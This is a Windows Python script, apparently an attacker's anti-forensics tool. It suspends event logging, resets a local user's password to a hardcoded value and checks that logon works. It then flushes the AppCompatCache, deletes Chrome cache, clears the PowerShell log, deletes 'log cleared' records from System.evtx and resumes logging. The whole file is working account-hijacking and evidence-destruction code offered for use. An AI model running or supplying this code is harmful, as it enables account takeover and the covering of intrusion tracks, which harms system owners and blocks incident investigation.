import subprocess, sys
import random
import string
import time
from bs4 import BeautifulSoup
import re
import win32com.shell.shell as shell

import win32api
import win32con
import win32event
import win32process
from win32com.shell.shell import ShellExecuteEx
from win32com.shell import shellcon

import os

from win32com import adsi
from win32security import LogonUser
from win32con import LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT


def set_password(username, password):
    ads_obj = adsi.ADsGetObject("WinNT://localhost/%s,user" % username)
    ads_obj.Getinfo()
    ads_obj.SetPassword(password)


def verify_success(username, password):
    try:
        LogonUser(
            username,
            None,
            password,
            LOGON32_LOGON_INTERACTIVE,
            LOGON32_PROVIDER_DEFAULT,
        )
    except:
        return False
    return True

# Pause Windows Event Logging
cmd = "C:\Tools\Eventlogedit-evtx\SuspendorResumeTid.exe suspend"
subprocess.call(cmd)

# Set random password
u = "Jonathan"
p = "P@ssw0rd"
#p = ''.join(random.choice(string.printable) for i in range(16))
set_password(u, p)
if verify_success(u, p):

    # Screenlock activated
    cmd = "rundll32.exe user32.dll, LockWorkStation"
    #subprocess.call(cmd)

    # Flush AppCompatCache
    cmd = "rundll32.exe kernel32.dll, BaseFlushAppcompatCache"
    subprocess.call(cmd)

    # Clean up Chrome cache
    exec(open("delete_chrome_cache.py").read())

# Delete Windows Event Logging - PowerShell Logs
    cmd = 'wevtutil.exe cl "Windows PowerShell"'
    subprocess.call(cmd)

# Delete Windows Event Logging - Event has been cleared logs
    cmd = 'wevtutil qe System "/q:*[System [(EventID=104)]]" /rd:true /c:10'
    output = subprocess.check_output(cmd)

    soup = BeautifulSoup(output, features="lxml")
    repElemList = soup.find_all('eventrecordid')

    for repElem in repElemList:
        temp = re.findall(r'\d+', str(repElem))
        res = ''.join(temp)
        #print(res)

        cmd = 'C:\Tools\Eventlogedit-evtx\DeleteRecord-EvtExportLog.exe System.evtx ' + res
        subprocess.call(cmd)
        cmd = 'C:\Tools\Eventlogedit-evtx\DeleteRecordbyGetHandleEx.exe System.evtx 1 temp.evtx'
        subprocess.call(cmd)
        os.remove('C:\\Tools\\temp.evtx')

# Resume Windows Event Logging
cmd = "C:\Tools\Eventlogedit-evtx\SuspendorResumeTid.exe resume"
subprocess.call(cmd)
